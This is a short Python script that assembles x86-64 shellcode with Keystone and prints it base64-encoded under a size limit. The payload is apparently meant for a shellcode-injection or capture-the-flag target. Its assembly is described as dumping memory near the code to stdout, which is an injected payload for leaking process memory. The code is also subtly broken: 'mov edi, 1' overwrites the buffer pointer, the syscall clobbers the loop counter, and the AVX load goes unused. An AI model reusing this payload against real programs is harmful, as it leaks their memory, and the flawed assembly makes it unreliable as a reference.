from keystone import Ks, KS_ARCH_X86, KS_MODE_64
import base64

ks = Ks(KS_ARCH_X86, KS_MODE_64)
asm = """    ; Dump memory using AVX2
    lea rdi, [rip]           ; Start reading near code
    xor ecx, ecx
    mov cl, 32               ; 32 * 32 = 1024 bytes

.loop:
    vmovdqu ymm0, [rdi]      ; Load 32 bytes from memory

    ; Write to stdout via syscall
    mov eax, 1               ; syscall: write
    mov edi, 1               ; stdout
    lea rsi, [rdi]           ; buffer
    mov edx, 32              ; length
    syscall

    add rdi, 32              ; advance buffer
    dec ecx
    jnz .loop

    ret
"""

shellcode, _ = ks.asm(asm, as_bytes=True)
assert len(shellcode) < 768
print(base64.b64encode(shellcode).decode())

